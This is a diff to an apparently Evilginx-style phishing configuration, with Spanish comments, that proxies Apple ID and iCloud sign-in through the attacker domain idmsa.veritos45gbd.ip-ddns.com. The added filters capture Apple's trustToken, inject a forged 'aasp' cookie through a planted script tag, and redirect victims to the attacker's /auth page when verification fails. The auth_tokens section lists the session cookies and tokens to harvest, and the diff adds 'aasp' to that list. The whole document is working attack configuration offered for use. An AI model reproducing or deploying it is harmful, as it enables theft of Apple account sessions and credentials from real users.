@@ -40,10 +40,14 @@ sub_filters:
   - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: '/s/22a2fa320fc235261c7d551419ccea23615b28b6338cd5b171a7b40190ad9645', replace: 'https://{hostname}/s/22a2fa320fc235261c7d551419ccea23615b28b6338cd5b171a7b40190ad9645', mimes: ['application/javascript']}
   # Inyectar x-apple-session-token en los encabezados de la solicitud
   - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: 'fetch\("/appleauth/auth/signin/complete"', replace: 'fetch("/appleauth/auth/signin/complete", { headers: { "X-Apple-Session-Token": "{x-apple-session-token}" }', mimes: ['application/javascript'], regex: true}
-  # Mantener trustTokens vacío
-  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: 'trustTokens:\s*\[\]', replace: 'trustTokens: []', mimes: ['application/javascript'], regex: true}
-  # Forzar la redirección a /auth buscando el mensaje en español
-  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: '"No se puede verificar tu identidad"', replace: 'window.location.href="https://idmsa.veritos45gbd.ip-ddns.com/auth";', mimes: ['application/javascript'], regex: true}
+  # Capturar el trustToken real
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: '"trustToken":"([^"]+)"', replace: '"trustToken":"$1"; window.trustToken="$1";', mimes: ['application/javascript', 'application/json'], regex: true}
+  # Inyectar el trustToken real (o simulado como respaldo)
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: 'trustTokens:\s*\[\]', replace: 'trustTokens: [window.trustToken || "simulated-trust-token"]', mimes: ['application/javascript'], regex: true}
+  # Inyectar la cookie aasp directamente en el HTML
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: '</head>', replace: '<script>document.cookie="aasp={aasp}; Path=/; Domain=idmsa.veritos45gbd.ip-ddns.com; HttpOnly; Secure; SameSite=None";</script></head>', mimes: ['text/html']}
+  # Forzar la redirección a /auth buscando el mensaje de error
+  - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: '"Cannot verify your identity"', replace: 'window.location.href="https://idmsa.veritos45gbd.ip-ddns.com/auth";', mimes: ['application/javascript'], regex: true}
   # Añadir encabezados de seguridad
   - {triggers_on: 'idmsa.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: '</head>', replace: '<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload"><meta http-equiv="X-Content-Type-Options" content="nosniff"><meta http-equiv="X-Frame-Options" content="DENY"><meta http-equiv="X-XSS-Protection" content="1; mode=block"></head>', mimes: ['text/html']}
   # Asegurar que las URLs absolutas apunten al proxy
@@ -72,7 +76,7 @@ sub_filters:
 
 auth_tokens:
   - domain: 'idmsa.apple.com'
-    keys: ['sessionid', 'scnt', 'X-Apple-ID-Session-Id', 'X-Apple-Session-Token', 'X-Apple-I-FD-Client-Info', 'X-Apple-Widget-Key', '.*,regexp', '__Host-sessionid', '__Secure-sessionid']
+    keys: ['sessionid', 'scnt', 'X-Apple-ID-Session-Id', 'X-Apple-Session-Token', 'X-Apple-I-FD-Client-Info', 'X-Apple-Widget-Key', 'aasp', '.*,regexp', '__Host-sessionid', '__Secure-sessionid']
   - domain: 'www.icloud.com'
     keys: ['X-APPLE-WEBAUTH-USER', 'X-APPLE-WEBAUTH-TOKEN', 'icloud_session', '.*,regexp']
   - domain: 'apple.com'
